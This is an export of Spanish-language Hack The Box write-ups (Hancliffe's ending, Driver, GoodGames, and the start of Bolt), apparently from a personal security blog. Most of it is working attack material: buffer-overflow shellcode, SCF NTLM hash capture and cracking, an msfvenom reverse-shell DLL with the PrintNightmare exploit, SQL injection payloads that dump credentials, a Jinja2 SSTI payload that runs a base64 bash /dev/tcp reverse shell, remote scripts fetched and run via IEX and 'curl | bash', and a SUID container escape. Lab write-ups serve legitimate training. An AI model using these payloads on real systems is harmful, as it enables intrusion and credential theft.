b'\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c' b'\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68' b'\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68' b'\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\x0a\\x0a\\x11\\x2c\\x68' b'\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61' b'\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2' b'\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6' b'\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44' b'\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56' b'\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff' b'\\x30\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6' b'\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb' b'\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5' ) sleep(1) r.sendline(shellcode) if __name__ == '__main__': main()  Si lo lanzamos contra la máquina víctima, conseguimos acceso como Administrator:\n$ python3 exploitH.py 10.10.11.115 9999 [+] Opening connection to 10.10.11.115 on port 9999: Done [*] Closed connection to 10.10.11.115 port 9999  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.115. Ncat: Connection from 10.10.11.115:59614. Microsoft Windows [Version 10.0.19043.1266] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami hancliffe\\administrator C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt e4d75760f0ac306abc83fefd82f85c36  El exploit final se puede encontrar aquí: exploit.py.\n","image":"/images/HTB/Hancliffe/Hancliffe.png","permalink":"https://7rocky.github.io/htb/hancliffe/","section":"htb","summary":"Hack The Box. Windows. Máquina difícil. Esta máquina tiene una página web que esconde una aplicación Nuxeo en Java vulnerable a SSTI después de romper la lógica de nginx. Luego accedemos a la máquina y encontramos una aplicación con un exploit público para acceder como otro usuario. Después, extraemos credenciales de Firefox y usamos un generador de contraseñas para acceder como otro usuario y encontrar un ejecutable de Windows. Después de hacer ingeniería inversa para obtener las credenciales esperadas, encontramos una vulnerabilidad de Buffer Overflow que necesita ser explotada mediante Socket Reuse para acceder como Administrator","time":24,"title":"Hancliffe"},{"contents":"  SO: Windows   Dificultad: Fácil   Dirección IP: 10.10.11.106   Fecha: 02 / 10 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.106 -p 80,135,445,5985 Nmap scan report for 10.10.11.106 Host is up (0.065s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc? 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: |_ start_date: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 52.40 seconds  Esta máquina tiene abiertos los puertos 80 (HTTP), 135 (MS-RPC), 445 (SMB) y 5985 (WinRM).\n$ crackmapexec smb 10.10.11.106 SMB 10.10.11.106 445 DRIVER [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)  Enumeración web Si vamos a http://10.10.11.106, la web solicita autenticación:\nSi probamos algunas credenciales por defecto (como admin:admin o user:password) vemos que admin:admin funciona:\nAquí encontramos una subida de archivos para el firmware de una impresora:\nLa página dice que alguien revisará los archivos subidos de manera manual.\nAtaque SCF La idea aquí es subir un archivo SCF (Shell Command File). Este es un tipo de archivo especial en Windows que puede ejecutar algunos comandos (por ejemplo, abrir el escritorio o el explorador de archivos).\nPodemos capturar el hash NTLMv2 utilizando impacket-smbserver o responder si le decimos a Windows que el icono del archivo se encuentra en una carpeta compartida por SMB.\nPor tanto, este es el archivo SCF (más información en pentesterlab.blog):\n[Shell] Command = 2 IconFile = \"\\\\10.10.17.44\\smbFolder\\test.ico\" [Taskbar] Command = \"ToggleDesktop\"  Ahora iniciamos un servidor SMB con impacket-smbserver:\n$ impacket-smbserver smbFolder $(pwd) -smb2support Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed  Y cuando subimos el archivo, capturamos el hash NTLMv2 de la autenticación por SMB contra nuestra máquina de atacante:\n[*] Incoming connection (10.10.11.106,49519) [*] AUTHENTICATE_MESSAGE (DRIVER\\tony,DRIVER) [*] User DRIVER\\tony authenticated successfully [*] tony::DRIVER:aaaaaaaaaaaaaaaa:5fbf672174a15ff654e2eb36ca408e50:010100000000000080393ee6082bd8014780fc0726c068f2000000000100100047004a006f0062006b004b0071004b000300100047004a006f0062006b004b0071004b000200100068007a004f004f0070007a0053004a000400100068007a004f004f0070007a0053004a000700080080393ee6082bd801060004000200000008003000300000000000000000000000002000006b26bbc466c417cdcf93367aee630e754d28aa6a1d925888d3eaa1a947cb84650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e0034003400000000000000000000000000 [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:SMBFOLDER)  Los hashes NTLMv2 solamente son útiles para romperlos con john o hashcatmediante un ataque de diccionario para conseguir la contraseña (la técnica de Pass the Hash no es posible). Entonces, vamos a romperlo:\n$ echo 'tony::DRIVER:aaaaaaaaaaaaaaaa:5fbf672174a15ff654e2eb36ca408e50:010100000000000080393ee6082bd8014780fc0726c068f2000000000100100047004a006f0062006b004b0071004b000300100047004a006f0062006b004b0071004b000200100068007a004f004f0070007a0053004a000400100068007a004f004f0070007a0053004a000700080080393ee6082bd801060004000200000008003000300000000000000000000000002000006b26bbc466c417cdcf93367aee630e754d28aa6a1d925888d3eaa1a947cb84650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e0034003400000000000000000000000000' \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Press 'q' or Ctrl-C to abort, almost any other key for status liltony (tony) 1g 0:00:00:00 DONE 5.555g/s 172088p/s 172088c/s 172088C/s one2three..harlan Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably Session completed.  Enumeración del sistema Y ahora nos podemos conectar a la máquina a través de WinRM mediante evil-winrm y capturar la flag user.txt:\n$ evil-winrm -i 10.10.11.106 -u tony -p liltony Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; type ..\\Desktop\\user.txt 21c0d12a3a866ed742c6be523acf4f24  El nombre de la máquina, su imagen y la fecha de lanzamiento son pistas para saber qué vector de ataque utilizar. Vamos a explotar la cola de impresión utilizando PrintNightmare (CVE-2021-1675).\nPara verificar que la máquina es vulnerable, podemos utilizar SpoolerScanner. Solamente tenemos que modificar el script de PowerShell y poner 10.10.11.106 como dirección IP y ejecutarlo desde PowerShell desde evil-winrm:\n*Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; IEX(New-Object Net.WebClient).DownloadString('http://10.10.17.44/SpoolerScan.ps1') True  Nos muestra que es vulnerable. Ahora podemos seguir los pasos para ejecutar PrintNightmare.\nExplotación de PrintNightmare El exploit requiere una versión específica de impacket. Para ello, utilizaré entornos virtuales con Python (venv) y así me evito desinstalar la versión impacket por defecto. Estos son los comandos que seguí para configurar el entorno:\n$ python3 -m venv PrintNightmare $ cd PrintNightmare $ source bin/activate $ git clone https://github.com/cube0x0/impacket $ cd impacket $ pip3 install -r requirements.txt $ python3 setup.py install $ cd ..  Ahora tenemos que crear una DLL maliciosa para instalarla en la máquina. Podemos utilizar msfvenom para ello:\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f dll -o rev.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 8704 bytes Saved as: rev.dll  Luego podemos arrancar un servidor SMB para servir el archivo DLL:\n$ impacket-smbserver smbFolder $(pwd) -smb2support Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed  Y ahora descargamos el exploit y lo ejecutamos con Python. Necesitamos indicarle el nombre del servidor (DRIVER, mostrado en la salida de nmap), las credenciales anteriores, la dirección IP y la ruta a la DLL maliciosa como recurso compartido por SMB:\n$ wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py $ python3 CVE-2021-1675.py DRIVER/tony:liltony@10.10.11.106 '\\\\10.10.17.44\\smbFolder\\rev.dll' [*] Connecting to ncacn_np:10.10.11.106[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.17.44\\smbFolder\\rev.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Try 3...  Vemos que recibimos una conexión en el servidor SMB:\n[*] Incoming connection (10.10.11.106,49530) [*] AUTHENTICATE_MESSAGE (\\,DRIVER) [*] User DRIVER\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa  Y también una conexión como Administrator utilizando nc porque la DLL se ejecuta:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.106. Ncat: Connection from 10.10.11.106:49531. Microsoft Windows [Version 10.0.10240] (c) 2015 Microsoft Corporation. All rights reserved. C:\\Windows\\system32whoami nt authority\\system C:\\Windows\\system32type C:\\Users\\Administrator\\Desktop\\root.txt 5408c0d30ba4747363d074210fa3e7f5  ","image":"/images/HTB/Driver/Driver.png","permalink":"https://7rocky.github.io/htb/driver/","section":"htb","summary":"Hack The Box. Windows. Máquina fácil. Esta máquina tiene una página web configurada con credenciales por defecto y una subida de archivos. Aquí podemos subir un archivo SCF para capturar el hash NTLMv2 del usuario y romperlo. Luego podemos explotar PrintNightmare. Para comprometer esta máquina se necesitan conocimientos básicos de explotación en Windows","time":4,"title":"Driver"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.130   Fecha: 21 / 02 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.130 -p 80 Nmap scan report for 10.10.11.130 Host is up (0.044s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-title: GoodGames | Community and Store Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.20 seconds  La máquina tiene abierto el puerto 80 (HTTP).\nEnumeración web Podemos empezar accediendo a http://10.10.11.130:\nVemos una página web que muestra algunos videojuegos, aunque muchos de los enlaces están desactivados. Podemos encontrar una sección de \u0026ldquo;blog\u0026rdquo;:\nPero no hay nada interesante aún. También tenemos un formulario de inicio de sesión:\nEvasión de la autenticación Una de las primeras cosas a probar cuando se tiene un formulario de este tipo es inyección de código SQL con un payload como ' or 1=1-- - (en el campo de usuario/email). Si lo hacemos y ponemos una contraseña cualquiera, nos saltamos la autenticación y accedemos como admin:\nEn este punto, podemos acceder a otra página web en http://internal-administration.goodgames.htb (pinchando en el icono de arriba a la derecha). Pero primero tenemos que añadir internal-administration.goodgames.htb al archivo /etc/hosts:\nNo tenemos credenciales. Podemos intentar una inyección de código SQL otra vez, pero no funciona.\nExplotación de SQLi En este punto, recordamos que teníamos una inyección de código SQL en la otra página. Utilizando esta, podemos obtener el contenido de la base de datos y buscar contraseñas potenciales.\nPrimero, vamos a identificar el tipo de SQLi que tenemos. De momento, podemos utilizarla como Boolean-based (Blind) SQLi, porque accedemos si una condición es cierta y obtenemos un error si es falsa:\n$ curl 10.10.11.130/login -sd \"email=' or 1=1-- -\u0026password=x\" | grep error $ curl 10.10.11.130/login -sd \"email=' or 1=2-- -\u0026password=x\" | grep error \u0026lt;h2 class=\"h4\"\u0026gt;Internal server error!\u0026lt;/h2\u0026gt;  Este tipo de SQLi puede ser utilizado para extraer el contenido de la base de datos pero carácter a carácter, por lo que el proceso será muy lento.\nNo obstante, podemos tratar de buscar un Union-based SQLi. Para ello, necesitamos agregar UNION SELECT y ver si el servidor refleja alguna de nuestras entradas, hasta que tengamos el número de columnas correcto:\n$ curl 10.10.11.130/login -sd \"email=' union select 111-- -\u0026password=x\" | grep -E '111' $ curl 10.10.11.130/login -sd \"email=' union select 111,222-- -\u0026password=x\" | grep -E '111|222' $ curl 10.10.11.130/login -sd \"email=' union select 111,222,333-- -\u0026password=x\" | grep -E '111|222|333' $ curl 10.10.11.130/login -sd \"email=' union select 111,222,333,444-- -\u0026password=x\" | grep -E '111|222|333|444' \u0026lt;h2 class=\"h4\"\u0026gt;Welcome 444\u0026lt;/h2\u0026gt;  Y aquí lo tenemos: la cuarta columna se está reflejando. Ahora podemos listar información básica acerca del gestor de base de datos:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,database()-- -\u0026password=x\" | grep Welcome \u0026lt;h2 class=\"h4\"\u0026gt;Welcome main\u0026lt;/h2\u0026gt; $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,version()-- -\u0026password=x\" | grep Welcome \u0026lt;h2 class=\"h4\"\u0026gt;Welcome 8.0.27\u0026lt;/h2\u0026gt; $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,user()-- -\u0026password=x\" | grep Welcome \u0026lt;h2 class=\"h4\"\u0026gt;Welcome main_admin@localhost\u0026lt;/h2\u0026gt;  Por comodidad, vamos a utilizar cut y sed en Bash para quitar los resultados no deseados:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,database()-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' main $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,version()-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' 8.0.27 $ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,user()-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' main_admin@localhost  Mucho mejor. Ya podemos comenzar el proceso de exfiltración. Primero de todo, tenemos que enumerar todas las bases de datos disponibles (main es la que está actualmente en uso):\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' information_schema,main  Utilizamos GROUP_CONCAT para evitar que varias filas se impriman juntas. Vemos que hay dos bases de datos (una de ellas es information_schema), por lo que solo nos centraremos en main. El siguiente paso es enumerar las tablas existentes en la base de datos:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='main'-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' blog,blog_comments,user  Hay tres tablas. La más interesante es user ya que es probable que contenga información sensible. Ahora tenemos que obtener el nombre de las columnas de esta tabla:\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='user'-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' email,id,name,password  Y como vemos, hay cuatro columnas. Vamos a usar CONCAT para juntar las cuatro columnas en un solo campo mediante espacios (0x20) y listar el contenido de la primera fila (LIMIT 1):\n$ curl 10.10.11.130/login -sd \"email=' union select 1,2,3,concat(id,0x20,email,0x20,name,0x20,password) from user limit 1-- -\u0026password=x\" | grep Welcome | cut -c44- | sed 's/$//g' 1 admin@goodgames.htb admin 2b22337f218b2d82dfc3b6f77e7cb8ec  Encontrando un SSTI Ahora tenemos el hash de la contraseña de admin. Parece que es un hash MD5, luego podemos tratar de romperlo. Esta vez, en lugar de utilizar un ataque de diccionario mediante john o hashcat usaremos tablas arcoíris (rainbow tables) para obtener la contraseña en texto claro. Por ejemplo, podemos ir a CrackStation:\nSi volvemos al formulario de http://internal-administration.goodgames.htb y usamos admin:superadministrator como credentiales, entramos:\nLa única acción que podemos realizar aquí es cambiar nuestro perfil:\nEn este punto, tenemos que darnos cuenta de que el servidor está usando Python (la salida de nmap lo muestra). Podemos verlo en las cabeceras de la respuesta HTTP:\n$ curl -I internal-administration.goodgames.htb HTTP/1.1 302 FOUND Date: Server: Werkzeug/2.0.2 Python/3.6.7 Content-Type: text/html; charset=utf-8 Content-Length: 218 Location: http://internal-administration.goodgames.htb/login  Además, podemos deducir que está utilizando Flask porque el mensaje de estado de la respuesta HTTP está en mayúsculas.\nCon esta información, podemos trataar de explotar Jinja2, que es el motor de plantillas por defecto de Flask. Este ataque es conocido como Server-Side Template Injection (SSTI) y puede derivar en ejecución de comandos.\nPrimero de todo, tenemos que verificar que es realmente vulnerable. Para ello podemos utilizar un payload sencillo como {{7*7}}, y si vemos 49, entonces es vulnerable. Una imagen vale más que mil palabras\u0026hellip;\nAhora podemos transformar el SSTI en ejecución remota de comandos (RCE) utilizando alguno de los payloads de PayloadsAllTheThings. Estaré utilizando este:\n{{cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read()}}  Contiene una reverse shell codificada en Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Si escuchamos con nc, recibiremos una conexión:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.130. Ncat: Connection from 10.10.11.130:56268. bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@3a453ab39d3d:/backend# script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null root@3a453ab39d3d:/backend# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm root@3a453ab39d3d:/backend# export TERM=xterm root@3a453ab39d3d:/backend# export SHELL=bash root@3a453ab39d3d:/backend# stty rows 50 columns 158  Enumeración del sistema Lo primero de lo que nos damos cuenta es de que somos root y de que el nombre del host es un poro raro. Esto son indicios de que estamos en un contenedor de Docker. Además, la dirección IP no es 10.10.11.130:\nroot@3a453ab39d3d:/backend# ls -la / total 96 drwxr-xr-x 1 root root 4096 Nov 5 15:23 . drwxr-xr-x 1 root root 4096 Nov 5 15:23 .. -rwxr-xr-x 1 root root 0 Nov 5 15:23 .dockerenv drwxr-xr-x 1 root root 4096 Feb 22 21:57 backend drwxr-xr-x 1 root root 4096 Nov 5 15:28 bin drwxr-xr-x 2 root root 4096 Oct 20 2018 boot drwxr-xr-x 5 root root 340 Feb 22 05:32 dev drwxr-xr-x 1 root root 4096 Feb 22 21:29 etc drwxr-xr-x 1 root root 4096 Nov 5 15:23 home drwxr-xr-x 1 root root 4096 Nov 16 2018 lib drwxr-xr-x 2 root root 4096 Nov 12 2018 lib64 drwxr-xr-x 2 root root 4096 Nov 12 2018 media drwxr-xr-x 2 root root 4096 Nov 12 2018 mnt drwxr-xr-x 2 root root 4096 Nov 12 2018 opt dr-xr-xr-x 470 root root 0 Feb 22 05:32 proc drwx------ 1 root root 4096 Feb 22 17:35 root drwxr-xr-x 1 root root 4096 Feb 22 13:19 run drwxr-xr-x 1 root root 4096 Nov 5 15:28 sbin drwxr-xr-x 2 root root 4096 Nov 12 2018 srv dr-xr-xr-x 13 root root 0 Feb 22 13:40 sys drwxrwxrwt 1 root root 4096 Feb 22 21:18 tmp drwxr-xr-x 1 root root 4096 Nov 12 2018 usr drwxr-xr-x 1 root root 4096 Nov 12 2018 var root@3a453ab39d3d:/backend# ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 5: eth0@if6: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0 valid_lft forever preferred_lft forever  Vemos que hay un archivo .dockerenv en el directorio raíz y que la dirección IP es 172.19.0.2.\nEs probable que la máquina anfitrión tenga un interfaz de red con dirección IP 172.19.0.1. Vamos a comprobarlo:\nroot@3a453ab39d3d:/backend# ping -c 1 172.19.0.1 PING 172.19.0.1 (172.19.0.1) 56(84) bytes of data. 64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.041 ms --- 172.19.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.041/0.041/0.041/0.000 ms  Ok, ahora vamos a realizar un escaneo de puertos desde el contenedor utilizando un script en Bash como este:\n#!/usr/bin/env bash for p in `seq 1 65535`; do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/172.19.0.1/$p \u0026amp;\u0026amp; echo \"Port $p open\" \u0026amp; done; wait  Es necesario realizarlo porque la máquina solamente tiene expuesto el puerto 80, pero no sabemos si tiene más puertos abiertos y expuestos en redes internas.\nPodemos servir este script con un servidor HTTP en Python y encadenarlo a Bash:\nroot@3a453ab39d3d:/backend# curl -s 10.10.17.44/port-scan.sh | bash Port 22 open Port 80 open  Y vemos que SSH está habilitado en la máquina. Vamos a ver si encontramos un nombre de usuario en el contenedor:\nroot@3a453ab39d3d:/backend# ls /home augustus  Y aquí está, ahora podemos tratar de reutilizar la contraseña que encontramos anteriormente:\nroot@3a453ab39d3d:/backend# ssh augustus@172.19.0.1 augustus@172.19.0.1's password: augustus@GoodGames:~$ cat user.txt ddbe9ee6b6856ae9e700f72fc2d3052b  Escalada de privilegios Un momento, antes vimos un directorio /home/augustus en el contenedor. Eso es extraño, vamos a volver y ver si realmente augustus es un usuario:\nroot@3a453ab39d3d:/backend# grep sh$ /etc/passwd root:x:0:0:root:/root:/bin/bash root@3a453ab39d3d:/backend# grep augustus /etc/passwd  No lo es, el único usuario en el contenedor es root. Por tanto, el contenedor tiene un montaje de volumen desde la máquina anfitrión (es decir, /home/augustus). Podemos verificarlo con df o mount:\nroot@3a453ab39d3d:/backend# df -h Filesystem Size Used Avail Use% Mounted on overlay 6.3G 5.9G 60M 100% / tmpfs 64M 0 64M 0% /dev tmpfs 2.0G 0 2.0G 0% /sys/fs/cgroup /dev/sda1 6.3G 5.9G 60M 100% /home/augustus shm 64M 0 64M 0% /dev/shm tmpfs 2.0G 0 2.0G 0% /proc/acpi tmpfs 2.0G 0 2.0G 0% /sys/firmware root@3a453ab39d3d:/backend# mount | grep augustus /dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)  Perfecto, la idea es copiar /bin/bash de la máquina a /home/augustus como usuario augustus y modificar su propietario y sus permisos para habilitar SUID desde el contenedor (como root):\nroot@3a453ab39d3d:/backend# ssh augustus@172.19.0.1 augustus@172.19.0.1's password: augustus@GoodGames:~$ cp /bin/bash . augustus@GoodGames:~$ ls bash user.txt augustus@GoodGames:~$ exit logout Connection to 172.19.0.1 closed. root@3a453ab39d3d:/backend# chown root:root /home/augustus/bash root@3a453ab39d3d:/backend# chmod 4755 /home/augustus/bash root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1 augustus@172.19.0.1's password: augustus@GoodGames:~$ ls bash user.txt  Y ahora solamente tenemos que ejecutar bash desde el directorio actual utilizando -p para que se utilice el privilegio SUID:\naugustus@GoodGames:~$ ./bash -p bash-5.1# cat /root/root.txt 075cbfa6e2f8a12e8024c7b1b08a4909  Como añadido, todos los pasos necesarios para comprometer la máquina se han programado en un script en Python llamado autopwn.py (explicación detallada aquí):\n$ python3 autopwn.py $WORDLISTS/rockyou.txt 10.10.17.44 4444 [*] Found database: main [*] Found tables: blog,blog_comments,user. Using: user [*] Found columns: email,id,name,password. Using: name,password [+] Found hashed password for \"admin\": 2b22337f218b2d82dfc3b6f77e7cb8ec [+] Cracking hash: superadministrator [*] Got CSRF token: IjJmM2FhN2M5NmQyNzMxMDYwYWUxNGRhODE2YThmNzkxYzY1YTdiZGQi.Yhdd1A.EFHJgaw43_YSRoK4TcJcKW0V098 [+] Trying to bind to :: on port 4444: Done [+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.11.130 on port 58366 [*] Using reverse shell: bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261 [*] Using SSTI payload: {{cycler.__init__.__globals__.os.popen(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\").read()}} [*] Found user: augustus [*] Connected to container at: 172.19.0.2 [*] SSH to 172.19.0.1 using credentials \"augustus:superadministrator\" [+] user.txt: b26a4127cbfb7a1bcbf8e59b1e864a77 [+] root.txt: c682307c4267caea83431507bad0819c [*] Set: alias bash=\"/home/augustus/bash -p\" [*] Using reverse shell: bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4445 0\u0026gt;\u00261 [+] Trying to bind to :: on port 4445: Done [+] Waiting for connections on :::4445: Got connection from ::ffff:10.10.11.130 on port 45680 [*] Switching to interactive mode bash-5.1#  ","image":"/images/HTB/GoodGames/GoodGames.png","permalink":"https://7rocky.github.io/htb/goodgames/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de código SQL desde donde podemos obtener una contraseña para acceder a una verb interna que es vulnerable a SSTI. Luego, ganamos acceso a un contenedor de Docker que monta un directorio de la máquina, de manera que podemos aprovecharlo para escalar privilegios. Para comprometer esta máquina se necesitan habilidades básicas de pentesting web y de Docker. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero","time":8,"title":"GoodGames"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.114   Fecha: 25 / 09 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.114 -p 22,80,443 Nmap scan report for 10.10.11.114 Host is up (0.038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Starter Website - About |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 16.23 seconds  La máquina tiene abiertos los puertos 22 